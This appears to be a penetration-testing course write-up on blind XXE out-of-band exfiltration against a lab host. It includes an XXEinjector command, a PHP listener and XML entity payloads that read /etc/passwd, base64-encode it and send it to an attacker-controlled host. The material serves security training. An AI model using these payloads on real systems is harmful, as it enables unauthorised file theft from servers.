In the previous section, we saw an example of a blind XXE vulnerability, where we did not receive any output containing any of our XML input entities. As the web server was displaying PHP runtime errors, we could use this flaw to read the content of files from the displayed errors. In this section, we will see how we can get the content of files in a completely blind situation, where we neither get the output of any of the XML entities nor do we get any PHP errors displayed.

If we try to repeat any of the methods with the exercise we find at `/blind`, we will quickly notice that none of them seem to work, as we have no way to have anything printed on the web application response. For such cases, we can utilize a method known as `Out-of-band (OOB) Data Exfiltration`, which is often used in similar blind cases with many web attacks, like blind SQL injections, blind command injections, blind XSS, and of course, blind XXE.

In our previous attacks, we utilized an `out-of-band` attack since we hosted the DTD file in our machine and made the web application connect to us (hence out-of-band). So, our attack this time will be pretty similar, with one significant difference. Instead of having the web application output our `file` entity to a specific XML entity, we will make the web application send a web request to our web server with the content of the file we are reading.

### Automated [XXEinjector](https://github.com/enjoiz/XXEinjector)
copy the HTTP request from Burp and write it to a file for the tool to use. We should not include the full XML data, only the first line, and write `XXEINJECT` after it as a position locator for the tool:

```http
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

Now, we can run the tool with the `--host`/`--httpport` flags being our IP and port, the `--file` flag being the file we wrote above, and the `--path` flag being the file we want to read. We will also select the `--oob=http` and `--phpfilter` flags to repeat the OOB attack we did above, as follows:

```bash
ruby XXEinjector.rb --host=10.10.15.155 --httpport=8000 --file=xxe.req --path=/etc/passwd --oob=http --phpfilter

cat Logs/10.129.201.94/etc/passwd.log 
```



### Manual
To do so, we can first use a parameter entity for the content of the file we are reading while utilizing PHP filter to base64 encode it. Then, we will create another external parameter entity and reference it to our IP, and place the `file` parameter value as part of the URL being requested over HTTP, as follows

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:80/?content=%file;'>">
```

PHP server script to decode b64
```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

```bash
adot8@htb[/htb]$ vi index.php # here we write the above PHP code
adot8@htb[/htb]$ php -S 0.0.0.0:80
```

Inject will look like this
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```
